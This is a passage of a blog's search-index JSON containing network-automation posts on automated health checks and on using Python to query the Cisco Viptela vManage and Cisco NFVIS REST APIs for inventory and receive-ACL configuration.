With this data gathering is only taking seconds to obtain, there is no reason not to gather a significant amount of information regardless of if you think it relevant at the time you are investigating.</p> <p>Because this information only takes a minute or two to obtain you can gather additional snapshots throughout an incident as the symptoms change. These snapshots are helpful in understanding what the state of your network was at specific times.</p> <p>Additionally, if during an incident a temporary workaround was put in place so that a vendors TAC team can be engaged to assist with root cause investigation, the information you obtained before implementing the temporary fix can be extremely useful by ensuring the vendor has as much information available to them as possible. This places you in a better position for identifying a permanent fix.</p>","tags":["Automation","Operations","AIOps"]},{"location":"2021/02/10/the-role-of-automated-health-checks/#conclusion","title":"Conclusion","text":"<p>Automated health checks are just one of the ways that you can implement automation within your environment. They are a low-risk high-reward type of automation that can save you significant time, reduce mean-time-to-repair (MTTR) and increase confidence and value within your organization. These types of health checks should focus on the easy tasks while you the engineer focus on the more complex tasks of an investigation. In upcoming posts I would like to cover a few methods that can be used to perform these health checks, common Python packages used, and a few examples. Stay tuned!</p>","tags":["Automation","Operations","AIOps"]},{"location":"2021/02/16/overview-of-the-viptela-vmanage-api/","title":"Overview of the Viptela vManage API","text":"<p>The move away from decentralized management of network devices has been a huge time saver when it comes to gathering data on these technologies. Although there is no single centralized manager or controller which manages all networking technologies, instead of querying each individual network device you have centralized managers for particular networking functions. Cisco DNAC for your wireless and switch infrastructure, Panorama, Cisco FirePower Management Center (FMC) or FortiManager for your firewall infrastructure, and in the case of this article Viptela's vManage for your SD-WAN overlay. While no centralized manager will be perfect, for many common bulk tasks it will save you quite a bit of time because of the API's that they expose to their administrators.</p> <p>I want to provide an overview of the Viptela vManage API and my experiences with it over the past year. While I have not had the chance to use the API for performing configuration and on-boarding activities, the experience I have gained includes using the API for data gathering, reporting, and automated health checks. In this article I will cover:</p> <ul> <li>What is Viptela vManage?</li> <li>Exploring the API</li> <li>How to authenticate with the API using Python</li> <li>How to query an API end-point using Python</li> <li>A few nuances I have found with the API</li> </ul> <p>This guide will not be providing an overview of Cisco's Viptela solution and all of the various components. Instead I will be focusing mostly on how to programmatically interact with the Viptela vManage controller.</p>","tags":["Cisco","Viptela","SD-WAN","Python"]},{"location":"2021/02/16/overview-of-the-viptela-vmanage-api/#what-is-viptela-vmanage","title":"What is Viptela vManage?","text":"<p>For those that are unaware of Cisco's Viptela SD-WAN offering, a Viptela vManage is one of the three controller types; vManage, vBond and vSmart. While vBond and vSmart control how a Viptela vEdge router authenticates with the SD-WAN overlay and receives routing information, the vManage controller is the single pane-of-glass management platform where you can configure, maintain and monitor all aspects of the SD-WAN overlay network. Most organizations will only have a single vManage controller as it is capable of managing up to 2000 devices, but larger organizations will have a cluster of vManage controllers. The vManage controller is accessed primarily through a web GUI or via a REST API.</p> <p>The vManage controller allows you to perform most basic troubleshooting without ever having to login to the vEdge routers directly. It exposes a dashboard showing WAN health across your entire overlay and allows you to view health information on individual vEdge device such as current CPU and memory utilization, hardware status, previous reboots and crashes, interface health and SD-WAN function health such as your TLOC, tunnel, and control connection health. There are detailed logs as well as in-depth application information of you have deep packet inspection (DPI) enabled.</p> <p>What I do find lacking in the vManage web GUI is the fact that you are not able to get status information on several critical network protocols such as VRRP, OSPF and BGP. In fact vManage seemingly doesn't care about these protocols when it comes to reporting on the health of a vEdge, indicating that a device status is 'green' even if there is an issue with one of these layer 3 protocols. Instead, you must either login to a vEdge via SSH or use the vManage API to obtain status information on these protocols.</p>","tags":["Cisco","Viptela","SD-WAN","Python"]},{"location":"2021/02/16/overview-of-the-viptela-vmanage-api/#exploring-the-api","title":"Exploring the API","text":"<p>The Viptela vManage REST API exposes a large amount of information through dozens of API end-points. The vManage REST API documentation provides details on each end-point, but I find one of the best ways to explore the API is live on your vManage directly by browsing to https://vmanage_ip:port/apidocs/ (entering your vManages IP address or hostname, and a port if not the default 443). The benefit of using the live API browser is that you are able to query the API and get live data from your own network, while the API provides details on what the different error codes are and what JSON properties are returned for each end-point.</p> <p>The API provides end-points that allow you to:</p> <ul> <li>View detailed alarms, logs and events</li> <li>Obtain inventory information</li> <li>Analyze detailed statistical information</li> <li>Perform real-time monitoring and troubleshooting</li> <li>Perform configuration changes by associating templates and policies</li> </ul> <p>You are able to perform typical CRUD (create, read, update, delete) functions agains the vManage API. The following example of an API end-point is one that provides you with an inventory of all vEdge devices associated with vManage:</p> <p>https://my-vmanage.company.com/dataservice/system/device/vedges</p> <p>By sending an HTTP GET request to the above API end-point (or even browsing to it in your web browser) you will see a JSON object returned that represents the inventory of your vEdge's. I have shown an example below of the information that you can now programmatically parse and report on.</p> <pre><code>\"data\": [\n    {\n      \"deviceType\": \"vedge\",\n      \"serialNumber\": \"aaabbbcccddd\",\n      \"ncsDeviceName\": \"vedge-aaabbbcccddd\",\n      \"configStatusMessage\": \"In Sync\",\n      \"templateApplyLog\": [\n        \"[8-Sep-2020 11:35:12 EDT] Configuring device with feature template: my_vEdge100B\",\n        \"[8-Sep-2020 11:35:12 EDT] Generating configuration from template\",\n        \"[8-Sep-2020 11:35:15 EDT] Checking and creating device in vManage\",\n        \"[8-Sep-2020 11:35:18 EDT] Device is online\",\n        \"[8-Sep-2020 11:35:18 EDT] Updating device configuration in vManage\",\n        \"[8-Sep-2020 11:35:19 EDT] Pushing configuration to device.\",\n        \"[8-Sep-2020 11:35:28 EDT] Pre-checks on vManage have passed. Continuing with pushing configuration to device.\",\n        \"[8-Sep-2020 11:35:35 EDT] Pushing configuration to device. Please wait ... \",\n        \"[8-Sep-2020 11:37:15 EDT] Completed template push to device.\",\n        \"[8-Sep-2020 11:37:16 EDT] Template successfully attached to device\"\n      ],\n      \"uuid\": \"aaabbbcccddd\",\n      \"managementSystemIP\": \"0.0.0.0\",\n      \"templateStatus\": \"Success\",\n      \"chasisNumber\": \"aaabbbcccddd\",\n      \"configStatusMessageDetails\": \"\",\n      \"configOperationMode\": \"vmanage\",\n      \"deviceModel\": \"vedge-100-B\",\n      \"deviceState\": \"READY\",\n      \"validity\": \"valid\",\n      \"platformFamily\": \"vedge-mips\",\n      \"vedgeCertificateState\": \"certinstalled\",\n      \"rootCertHash\": \"f33793721bea88e0f718838bfa954588\",\n      \"deviceIP\": \"192.168.25.104\",\n      \"personality\": \"vedge\",\n      \"uploadSource\": \"File Upload\",\n      \"local-system-ip\": \"192.168.25.104\",\n      \"system-ip\": \"192.168.25.104\",\n      \"model_sku\": \"None\",\n      \"site-id\": \"104\",\n      \"host-name\": \"my_vEdge4\",\n      \"version\": \"19.2.3\",\n      \"vbond\": \"192.168.1.3\",\n      \"vmanageConnectionState\": \"connected\",\n      \"lastupdated\": 1613484157308,\n      \"reachability\": \"reachable\",\n      \"uptime-date\": 1595364900000,\n      \"defaultVersion\": \"19.2.3\",\n      \"availableVersions\": [\n        \"19.2.2\"\n      ],\n      \"template\": \"my_vEdge100B\",\n      \"templateId\": \"aa914bc6-d777-421e-a2a4-314693bc49c5\",\n      \"lifeCycleRequired\": false,\n      \"expirationDate\": \"NA\",\n      \"hardwareCertSerialNumber\": \"NA\"\n    },\n    ...\n</code></pre>","tags":["Cisco","Viptela","SD-WAN","Python"]},{"location":"2021/02/16/overview-of-the-viptela-vmanage-api/#authenticating-with-the-vmanage-api","title":"Authenticating with the vManage API","text":"<p>Now that you have a high-level idea of the benefits the vManage API provides you lets look at an example of using Python to authenticate with the vManage API. Because information in vManage isn't publicly exposed, it requires that each query be authenticated. Cisco provides a great Python example class that can be used with the REST API for GET and POST calls and details below will follow that example in a simpler fashion.</p> <p>Note</p> <p>There is no explicit configuration needed to enable the vManage API. Instead, you simply use the API end-point paths in the API documentation and authenticate with your regular administrator credentials. Access is granted based on the roles associated with your ID.</p> <p>First start off by importing the Requests package and disabling certificate warnings (unless you already have a trusted certificate on your vManage). The Requests package is a great utility for interfacing with HTTP based servers such as the vManage API.</p> <pre><code>&gt;&gt;&gt; import requests\n&gt;&gt;&gt; from requests.packages.urllib3.exceptions import InsecureRequestWarning\n&gt;&gt;&gt; requests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n</code></pre> <p>Lets now create a few variables that we will be using when interfacing with the API such as the base URL, authentication path, username and password. Replace the content of the variables below with the information for your environment. The authentication path that must be used with the vManage API is /j_security_check.</p> <pre><code>&gt;&gt;&gt; base_url = 'https://my-vmanage.company.com'\n&gt;&gt;&gt; auth_path = '/j_security_check'\n&gt;&gt;&gt; username = 'my_username'\n&gt;&gt;&gt; password = 'my_password'\n</code></pre> <p>Now we can create a Requests session that will authenticate us against the API. We do so by sending an HTTP POST request to the authentication path and providing our username and password in the request body as a JSON object with specific parameter keys named <code>j_username</code> and <code>j_password</code>. These are keys that the vManage API defines and requires. The verify parameter of the session POST allows me to ignore untrusted certificates in my lab, and specifying a timeout value is a best-practice when using the sending a request so that the Requests package doesn't sit there indefinitely.</p> <pre><code>&gt;&gt;&gt; req_url = base_url + auth_path\n&gt;&gt;&gt; req_data = {'j_username': username, 'j_password': password}\n&gt;&gt;&gt; sess = requests.session()\n&gt;&gt;&gt; resp = sess.post(url=req_url, data=req_data, verify=False, timeout=10)\n</code></pre> <p>So we have now established an HTTP session with our vManage and we can verify that we have successfully established this session based on the HTTP status code 200:</p> <pre><code>&gt;&gt;&gt; resp.status_code\n200\n</code></pre> <p>However, if we close the existing session and establish a new session with incorrect credentials you will see that although we fail authentication an HTTP 200 (OK) is still returned. Normally you would expect an HTTP 401 status code (Unauthorized)</p> <pre><code>&gt;&gt;&gt; sess.close()\n&gt;&gt;&gt; req_data = {'j_username': 'mybadusername', 'j_password': 'mybadpassword'}\n&gt;&gt;&gt; sess = requests.session()\n&gt;&gt;&gt; resp = sess.post(url=req_url, data=req_data, verify=False, timeout=10)\n&gt;&gt;&gt; resp.status_code\n200\n</code></pre> <p>What you will see is that if you fail to authenticate against the API the HTTP status code is still 200, but the content of the response is the authentication form on the /j_security_check page. The following is a trimmed down version of the response content but it shows an HTML paragraph tag indicating 'Invalid User or Password'</p> <pre><code>&gt;&gt;&gt; resp.content.decode('utf-8')\n'&lt;html&gt;\n...\n&lt;span&gt;Cisco vManage&lt;/span&gt;&lt;/div&gt;\\n\\t\\t\\t\\t\\t&lt;p id=\"errorMessageBox\" name=\"errorMessageBox\" class=\\'errorMessageBox \\'&gt;Invalid User or Password&lt;/p&gt;\n...\n&lt;/html&gt;'\n</code></pre> <p>So as Cisco's example class] indicates, if there is an  tag in the response content the login failed. A successful response returns a status code of 200 and no content <pre><code>&gt;&gt;&gt; resp.status_code\n200\n&gt;&gt;&gt; resp.content.decode('utf-8')\n''\n</code></pre> <p>A quick method of validating if the login was successful would be a quick if statement searching for an HTML tag in the response content:</p> <pre><code>import sys\nif '&lt;html&gt;' in resp.content.decode('utf-8'):\n    print('vManage login failed')\n    sys.exit()\nelse:\n    print('vManage login successful')\n</code></pre>","tags":["Cisco","Viptela","SD-WAN","Python"]},{"location":"2021/02/16/overview-of-the-viptela-vmanage-api/#sending-queries-to-the-vmanage-api","title":"Sending Queries to the vManage API","text":"<p>Now that we are successfully authenticated with the vManage API and a session established for sending requests across, lets explore sending requests and reading the response content. First lets set our request path to the inventory end-point I mentioned earlier in this article. We will then append this to the req_url variable</p> <pre><code>&gt;&gt;&gt; req_path = '/dataservice/system/device/vedges'\n&gt;&gt;&gt; req_url = base_url + req_path\n&gt;&gt;&gt; req_url\n'https://my-vmanage.company.com/dataservice/system/device/vedges'\n</code></pre> <p>To query this end-point using the existing session we send an HTTP GET request and store the response and can also validate the response status code is 200 (OK)</p> <pre><code>&gt;&gt;&gt; resp = sess.get(url=req_url, verify=False, timeout=10)\n&gt;&gt;&gt; resp.status_code\n200\n</code></pre> <p>The Requests package has a useful class function <code>.json()</code> that allows us to convert JSON response objects (which the vManage API sends us) to a Python dictionary. This dictionary has two keys named <code>header</code> and <code>data</code></p> <pre><code>&gt;&gt;&gt; data = resp.json()\n&gt;&gt;&gt; data.keys()\ndict_keys(['header', 'data'])\n</code></pre> <p>The nested <code>header</code> dictionary in your response object contains information that desribes the nested <code>data</code> dictionary. I don't often use the header dictionary other than to initially understand how the response data is transformed. If we look at the actual response data we see that it is a list of dictionaries, with each index in the list describing a vEdge router in the inventory that we queried. In our case we have four entries in this list and each entry has the keys as described below</p> <pre><code>&gt;&gt;&gt; type(data['data'])\n&lt;class 'list''&gt;\n&gt;&gt;&gt; len(data['data'])\n4\n&gt;&gt;&gt; data['data'][0].keys()\ndict_keys(['deviceType', 'serialNumber', 'ncsDeviceName', 'configStatusMessage', 'templateApplyLog', 'uuid', 'managementSystemIP', 'templateStatus', 'chasisNumber', 'configStatusMessageDetails', 'configOperationMode', 'deviceModel', 'deviceState', 'validity', 'platformFamily', 'vedgeCertificateState', 'rootCertHash', 'deviceIP', 'personality', 'uploadSource', 'local-system-ip', 'system-ip', 'model_sku', 'site-id', 'host-name', 'version', 'vbond', 'vmanageConnectionState', 'lastupdated', 'reachability', 'uptime-date', 'defaultVersion', 'availableVersions', 'template', 'templateId', 'lifeCycleRequired', 'expirationDate', 'hardwareCertSerialNumber'])\n</code></pre> <p>As I have already briefly described this response data in the Exploring the API section above, I won't be going into further detail other than to say that this response data can be used to build an inventory report of your vEdge devices or to obtain basic status information as it relates to vManage's perspective.</p> <p>I want to touch on synced data within the vManage API. The vManage controller contains a significant amount of information about the SD-WAN overlay and the vEdge devices within the vManage controller directly. API queries about this data are very fast because vManage doesn't need to contact a device to obtain additional data. However, when it comes to the real-time monitoring API's information may be out-of-data on vManage and the default option is that after you query the vManage API the controller actually needs to contact the end device for that data. Depending on the depth of information, queries that aren't synced with vManage can take a long time and you will need to adjust the Requests timeout value accordingly.</p> <p>So, how do you tell if a query is synced with vManage? Within the API end-point path you should see a 'synced' flag. An example of a synced path is:</p> <p>https://vmanage-ip-address/dataservice/device/bfd/synced/sessions?deviceId=deviceId</p> <p>The same path that is not synced, and therefore requires vManage to query the end device to obtain details is:</p> <p>https://vmanage-ip-address/dataservice/device/bfd/sessions?deviceId=deviceId</p> <p>The above two paths query for BFD sessions from a particular vEdge device represented by the deviceId parameter (the system IP associated with a vEdge). Depending on your overlays policies, a device can have hundreds or thousands of BFD sessions. As a result, if you use the vManage synced path you will get a response far quicker than vManage having to query the vEdge router for the most up-to-date data. Often times the synced data will sufficient and only several minutes behind that of the action vEdge.</p>","tags":["Cisco","Viptela","SD-WAN","Python"]},{"location":"2021/02/16/overview-of-the-viptela-vmanage-api/#vmanage-api-nuances","title":"vManage API Nuances","text":"<p>I have already highlighted one instance of an oddity with the vManage API when describing the authentication process and the fact that vManage doesn't return an HTTP 401 Unauthorized message if your authentication attempt was rejected. There are several other nuances that I have found when working with the vManage API.</p> <p>It seems that consistent naming of response object property names across different API end-points, as well as spelling, was not a concern for Cisco. In the device inventory response object earlier in this post one of the property names was <code>chasisNumber</code>. Examples of inconsistent property names between end-points include those related to interface names. When checking for ARP table statistics, an entry associated with an interface uses the property name <code>if-name</code> while checking the status of an interface uses a property name of <code>ifname</code>. The same goes for the properties <code>ip</code> and <code>ip-address</code> associated with the ARP and interface status API end-points respectively. While these aren't a big deal overall, it does make things a little bit tricky when trying to initially write your code.</p> <p>Some timestamp fields in responses report timestamps in Unix time down to the millisecond, others report it as a date/time with timezone info format. By using milliseconds in Unix time, you need to use a few tricks when converting this into a human readable timestamp. The following uses a timestamp from the <code>lastupdated</code> property in the device inventory API call we made earlier, which returned 1613484157308 as a value. As shown below, the default timestamp value will receive an error when converting this to a human readable format. After making the value less specific and converting from milliseconds to seconds you are able to easily use the datetime module to convert into a human readable timestamp. I'm sure there are more elegant ways around this.</p> <pre><code>&gt;&gt;&gt; from datetime import datetime\n&gt;&gt;&gt; ts = 1613484157308\n&gt;&gt;&gt; datetime.utcfromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nValueError: year 53099 is out of range\n&gt;&gt;&gt;\n&gt;&gt;&gt; ts = 1613484157308 / 1000\n&gt;&gt;&gt; datetime.utcfromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')\n'2021-02-16 14:02:37'\n</code></pre> <p>Despite these few nuances, the API is very easy to work with and I have found it very useful on many occasions! I hope that you have found this post useful and I would appreciate any feedback that you might have. Feel free to reach out at the social media links above!</p>","tags":["Cisco","Viptela","SD-WAN","Python"]},{"location":"2021/03/02/initial-thoughts-on-cisco-nfvis-api/","title":"Initial Thoughts on Cisco NFVIS API","text":"<p>With multiple Cisco NFVIS software upgrades planned in the near future I thought I would explore the API to see how this might help speed up the process. My initial goals for exploring the API were to:</p> <ul> <li>Discovery which end-points can be used for hardware and software inventory reporting</li> <li>Determine how to update the IP receive ACL's</li> <li>Automate transfer and registration of the new NFVIS image files</li> </ul> <p>Note</p> <p>Cisco Network Function Virtualization Infrastructure Software (NFVIS) is a Linux-based infrastructure software designed for the virtualization of network functions such as Cisco's ISRv, ASAv, vWAAS and NGFWv as well as third-party platforms. This allows an organization to service-chain network functions without the need of deploying extra hardware.</p> <p>For those that aren't familiar with the upgrade procedure of a Cisco ENCS platform running the NFVIS software, it is quite different than your typical Cisco router or switch. And understandably so, these devices are much more like a server running a hypervisor. Upgrading involves first identifying the correct image to move to (which has compatibility with the Cisco and 3rd party image you are running), copying the new image file to the platform, registering the image file (essentially a series of healthchecks on the file), and finally initiating the upgrade with that image. There big issue with the NFVIS software is that there is no method to downgrade to a previous release once you have upgraded.</p>","tags":["Cisco","Python"]},{"location":"2021/03/02/initial-thoughts-on-cisco-nfvis-api/#cisco-nfvis-api-documentation","title":"Cisco NFVIS API Documentation","text":"<p>The first hurdle that I came across was when attempting to load Cisco's API Referencethrough their regular site. For the past few weeks myself and others on my team have received a message when browsing to this link where it doesn't load the page and simply returns the text 'null' under the Book Table of Contents section. I have been able to get a few results on Google linking to direct chapters, but not the chapters I needed for NFVIS system API calls. I eventually stumbled across Cisco Content Hub. This was my first time playing around with this content site but I was able to find the information I needed.</p>","tags":["Cisco","Python"]},{"location":"2021/03/02/initial-thoughts-on-cisco-nfvis-api/#api-basics","title":"API Basics","text":"<p>The NFVIS REST API uses HTTP Basic Authentication as its authentication scheme. This authentication scheme transmits the username and password as base64 encoded strings, which means that they are passed over the network as clear text. HTTPS/TLS should always be used with the management of any network device if you are using a web GUI or API calls, so as a result the Cisco ENCS and NVFIS software protects these credentials from being eavesdropped on. These credentials are included as a key/value pair in the HTTP Headers. Including Basic Authentication in the Python Requests module is quite simple (details will be shown in a section below).</p> <p>When exchanging data with the NFVIS API you have two options for the format of which you would like to work with; JSON or XML. I prefer working with JSON as there is a standard JSON Python library for working with it, but both formats can easily be converted into Python dictionaries. The standard XML Python library isn't very user friendly, but xmltodict is a good open-source alternative. Whichever method you pick will require that you set the HTTP headers of Content-Type and Accept with the values in the table below.</p> Data Format Content-Type and Accept Header Value XML application/vnd.yang.data+xml JSON application/vnd.yang.data+json JSON (alternative) application/vnd.yang.collection+json <p>Although the documentation generalizes and indicates to use the above content-types, I have found that in some circumstances the content-type and accept header needs to be set to <code>application/vnd.yang.collection+json</code>. My particular use-case was when querying for ENCS switch (not PNIC interfaces) interface statistics. No where did it indicate in the documentation to use a YANG collection in the content-type/accept headers until you look at the example for the API end-point <code>/api/running/switch/interface/gigabitEthernet</code> to display the configuration of all interfaces (versus a single interface). This really tripped me up in the past until I finally saw the change in header value.</p> <p>Another thing to note is that you can specify a URL query parameter of <code>?deep</code> on GET requests for some API end-points that allow you to gather more detailed information. An example would be the API end-point for verifying a bridge configuration which is <code>/api/config/bridges?deep</code>.</p> <p>Lets look at a quick example of how to specify these settings when making an API GET request.</p> <pre><code>from urllib.parse import urljoin\nimport requests\nfrom requests.auth import HTTPBasicAuth\n\nBASE_URL = 'https://10.1.1.1'\nPATH = '/api/operational/platform-detail'\nurl = urljoin(BASE_URL, PATH)\nheaders = {\n    'Content-Type': 'application/vnd.yang.data+json',\n    'Accept': 'application/vnd.yang.data+json',\n}\n\nusername = 'myuser'\npassword = 'mypassword'\n\nresp = requests.get(\n    url,\n    headers=headers,\n    verify=False,\n    timeout=20,\n    auth=HTTPBasicAuth(username, password)\n)\n\nresp_data = resp.json()\n</code></pre> <p>The above example sets our base URL and path so that we can query the API to get the platform details of the NFVIS device. We set our HTTP headers content-type and accept so that we will receive a JSON result. We then initiate a query with the Requests package by providing our URL, headers, and an authentication scheme of Basic with the username and password. Finally, if the query was successful we convert the JSON response into a Python dictionary named resp_data so that we can parse the data.</p>","tags":["Cisco","Python"]},{"location":"2021/03/02/initial-thoughts-on-cisco-nfvis-api/#hardware-and-software-inventory","title":"Hardware and Software Inventory","text":"<p>As with any software upgrade project you need to identify what software is currently running across your inventory. Although it appears that it might be possible to manage Cisco ENCS platforms with Cisco DNA Center, thats currently not an option with what I'm working with. As a result, I explored which API end-points might be possible to obtain this information and came across <code>/api/operational/platform-detail</code>. Based on the API query we made in the API Basics section above, lets look at the response data</p> <p>The first and only key in the dictionary represents the platform info. I have printed from this key onwards instead of the full dictionary as the formatting is easier to view below.</p> <pre><code>&gt;&gt;&gt; from pprint import pprint\n&gt;&gt;&gt; pprint(resp_data['platform_info:platform-detail'])\n{'hardware_info': {'BIOS-Version': 'ENCS54_2.6.071220181123',\n                   'CIMC-Version': 'NA',\n                   'CIMC_IP': 'NA',\n                   'CPU_Information': 'Intel(R) Xeon(R) CPU D-1557 @ 1.50GHz '\n                                      '12 cores',\n                   'Compile_Time': 'Friday, October 19, 2018 [12:41:34 PDT]',\n                   'Disk_Size': '200.0 GB',\n                   'Entity-Desc': 'Enterprise Network Compute System',\n                   'Entity-Name': 'ENCS',\n                   'Manufacturer': 'Cisco Systems, Inc.',\n                   'Memory_Information': '32741192 kB',\n                   'PID': 'ENCS5412/K9',\n                   'SN': 'FGL#########',\n                   'UUID': 'aaabbbcccdddeeefff',\n                   'Version': '3.9.2-FC4',\n                   'hardware-version': 'M3'},\n 'port_detail': [{'Name': 'GE0-0'}, {'Name': 'GE0-1'}, {'Name': 'MGMT'}],\n 'software_packages': {'Kernel_Version': '3.10.0-693.11.1.1.el7.x86_64',\n                       'LibVirt_Version': '3.2.0',\n                       'OVS_Version': '2.5.2',\n                       'QEMU_Version': '1.5.3'},\n 'switch_detail': {'Name': 'NA', 'Ports': 8, 'Type': 'NA', 'UUID': 'NA'}}\n</code></pre> <p>Looking further into this structure we can see that a variety of information is available and helpful in building out both a hardware and software inventory if we were to scan all NFVIS platforms in the environment. Within the information above I'm mainly looking at the following fields:</p> <ul> <li>SN - The serial number of the chassis</li> <li>PID - The Product ID of the chassis</li> <li>Version - The NFVIS software version currently being used</li> </ul> <p>Placing this information into a report (ex. CSV) can help you track a software upgrade project, as it is easy to programmatically query all of your NFVIS platforms on a regular basis to see what has and has not been upgraded yet.</p>","tags":["Cisco","Python"]},{"location":"2021/03/02/initial-thoughts-on-cisco-nfvis-api/#updating-ip-receive-acls","title":"Updating IP Receive ACLs","text":"<p>To be able to upgrade the NFVIS software you need to be able to transfer the new image file to the device. This can be performed using the web GUI (which will automatically register the image) or through using SCP. SCP is a great choice for programmatically performing this option but it requires that the host you are sending the files from is included in an IP receive ACL on the NFVIS device and that the scpd protocol is permitted in that ACL. As an example, if our file server had IP address 10.4.4.40 the command we would use on the CLI of the NFVIS platform to allow this would be:</p> <pre><code>config t\n   system settings ip-receive-acl 10.4.4.40/32 service [ ssh https icmp scpd snmp ] priority 10 action accept\n</code></pre> <p>The above command permits only our specific host IP to communicate with various services like SSH, HTTPS, ICMP, SCPD, and SNMP. You can add or remove services based on your deployment, but for this specific use-case we need SCPD. Additionally, the priority number of 10 was arbitrarily chosen by me but think of it as the ACL sequence number. The action can be either accept, reject or drop.</p> <p>However, going through a large number of devices and configuring these receive ACL's would be difficult to manage and maintain and performing this programmatically would be far quicker. Unfortunately, what I'm about to show is that using the NFVIS API doesn't make this an easy task.</p> <p>To perform this using the NFVIS API you need to use the System Configuration API's but the documentation doesn't actually tell you how to specifically update the ip-receive-acl. In fact, it doesn't mention receive ACL's at all. It was only in diving through the Ansible NFVIS Role that I was able to understand this further. The particular API end-point that must be used is <code>/api/config/system/settings</code> with a PUT request which is used to both modify or replace an existing resource. As Cisco's API Request Methods documentation indicates, the PUT operation must contain the complete representation of the mandatory attributes of the resource. This means you need to include the configuration for the hostname, default-gw, managment IP address and management IP netmask.</p> <p>Exploring the response data by continuing with the Python code that was run in the API Basics section above, but now we will send a HTTP GET to the end-point <code>/api/config/system/settings</code></p> <pre><code>PATH = '/api/config/system/settings'\nurl = urljoin(BASE_URL, PATH)\n\nresp = requests.get(\n    url,\n    headers=headers,\n    verify=False,\n    timeout=20,\n    auth=HTTPBasicAuth(username, password)\n)\n\nresp_data = resp.json()\n</code></pre> <p>Now that we have our response data in a Python dictionary we can see what information in the below output that all of the mandatory fields are included (hostname, default-gw, managment IP address and netmask), but some additional details are also included (CIMC access, logging servers and levels and IP receive ACL details). What you can also see is that the IP receive ACL information does not include details like what we see in the CLI commands that would be used to configure this, namely the action, priority, and services. We are not able to get this information from the API.</p> <pre><code>&gt;&gt;&gt; pprint(resp_data)\n{'system:settings': {'cimc-access': 'enable',\n                     'default-gw': '10.1.1.1',\n                     'hostname': 'ENCS-WAN1',\n                     'ip-receive-acls': {'ip-receive-acl': [{'source': '0.0.0.0/0'},\n                                                            {'source': '10.3.3.0/24'}]},\n                     'logging': {'host': [{'host': '10.3.3.30'}],\n                                 'severity': 'informational'},\n                     'mgmt': {'ip': {'address': '10.1.1.2',\n                                     'netmask': '255.255.255.0'}},\n                     'wan': {'ip': {'address': '192.168.1.1',\n                                    'netmask': '255.255.255.252'},\n                             'vlan': 10}}}\n</code></pre> <p>So I want to be able to update the ip-receive-acls to include a new entry for 10.4.4.40/32. In the Ansible NFVIS Role I was able to see that to add an entry the existing ip-receive-acl list like shown below (taken from ansible-nfvis/library/nfvis_system.py in the Ansible role)</p> <pre><code>    response = nfvis.request('/config/system/settings')\n    ...\n\n    payload = {'settings':response['system:settings']}\n    if nfvis.params['trusted_source']:\n        ip_receive_acl = []\n        for network in nfvis.params['trusted_source']:\n            ip_receive_acl.append({'source': network, 'action': 'accept', 'priority': 0, 'service': ['https', 'icmp', 'netconf', 'scpd', 'snmp', 'ssh']})\n        if 'ip-receive-acls' in payload['settings'] and 'ip-receive-acl' in payload['settings']['ip-receive-acls']:\n            if payload['settings']['ip-receive-acls']['ip-receive-acl'] != ip_receive_acl:\n                nfvis.result['what_changed'].append('trusted_source')\n                payload['settings']['ip-receive-acls'] = {'ip-receive-acl': ip_receive_acl}\n        else:\n            nfvis.result['what_changed'].append('trusted_source')\n            payload['settings']['ip-receive-acls'] = {'ip-receive-acl': ip_receive_acl}\n</code></pre> <p>Essentially the Ansible Role takes what is currently configured and assigns it to the response variable. Then the new payload variable is created by copying all existing system settings from the response variable. This ensures that all mandatory fields as well as all other fields are still defined with what we will be sending back to the API. Finally, if an Ansible YAML variable of <code>trusted_source</code> was set, iterate through entries and append each as a configuration which includes the source, action, prioority and services that are predefined within the role above. Evenetually it updates the payload with the new and old <code>ip-receive-acls</code> entries. This seems like a TON of work to simply add a single entry. You have to add all previous entries, merge them with your new entries, etc.</p> <p>I wanted to test out if the Ansible Role was complex for a specific reason or simply if the NFVIS API required it to be that way, so I tested out a few things myself. I have included comments to describe what I'm testing in the below output.</p> <pre><code>import json\n\n# A new dictionary representing a new IP receivel ACL entry I want to add\nnew_entry = {'settings': {'ip-receive-acls': {'ip-receive-acl': [{'priority': 10, 'action': 'accept', 'source': '10.4.4.40/32', 'service': ['https', 'icmp', 'scpd', 'snmp', 'ssh']}]}}}\n\n# The API requires we send it data in JSON or XML. I chose JSON\n# json.dumps() converts our Python dict into a JSON string\njson_entry = json.dumps(new_entry)\n\n# Now to HTTP PUT the data to the server\nPATH = '/api/config/system/settings'\nurl = urljoin(BASE_URL, PATH)\n\nresp = requests.put(\n    url,\n    headers=headers,\n    verify=False,\n    timeout=20,\n    auth=HTTPBasicAuth(username, password),\n    data=json_entry\n)\n\n# Looking at the response status code we got a 400 and an error:\n&gt;&gt;&gt; resp.status_code\n400\n&gt;&gt;&gt; resp.json()\n{'errors': {'error': [{'error-message': 'unknown element: settings in /system:system/system:settings/system:settings', 'error-urlpath': '/api/config/system/settings', 'error-tag': 'malformed-message'}]}}\n\n# So we need to include mandatory fields, lets try this instead\nnew_entry = {'system:settings': {'wan': {'vlan': 10, 'ip': {'netmask': '255.255.255.252', 'address': '192.168.1.1'}}, 'default-gw': '10.1.1.1', 'hostname': 'ENCS-WAN1', 'cimc-access': 'enable', 'ip-receive-acls': {'ip-receive-acl': [{'priority': 0, 'action': 'accept', 'source': '0.0.0.0/0', 'service': ['https', 'icmp', 'snmp', 'ssh'{'priority': 10, 'action': 'accept', 'source': '10.4.4.40/32', 'service': ['https', 'icmp', 'scpd', 'snmp', 'ssh']}]}, 'mgmt': {'ip': {'netmask': '255.255.255.0', 'address': '10.1.1.2'}}, 'logging': {'host': [{'host': '10.3.3.30'}], 'severity': 'informational'}}}\njson_entry = json.dumps(new_entry)\nresp = requests.put(\n    url,\n    headers=headers,\n    verify=False,\n    timeout=20,\n    auth=HTTPBasicAuth(username, password),\n    data=json_entry\n)\n&gt;&gt;&gt; resp.status_code\n200\n</code></pre> <p>After sending the HTTP PUT when testing this out I actually received a timeout exception. Make sure you include the timeout=20 parameter in your Requests call. This is because the Cisco NFVIS platform needs to commit the change that you sent to it and this seems to take a long time.</p> <p>The difficulty with the working solution above is:</p> <ol> <li>You need to redefine the already existing ACL entry for 0.0.0.0/0, but you don't actually know how it was configured because you can't see that in the original HTTP GET request</li> <li>If you forget to include all previous entries, they are actually removed from the configuration so you have the ability to cause an impact</li> </ol> <p>The only way I can see this being effective is if you are doing something close to Infrastructure as Code (IAC) and have a template of what IP receivel 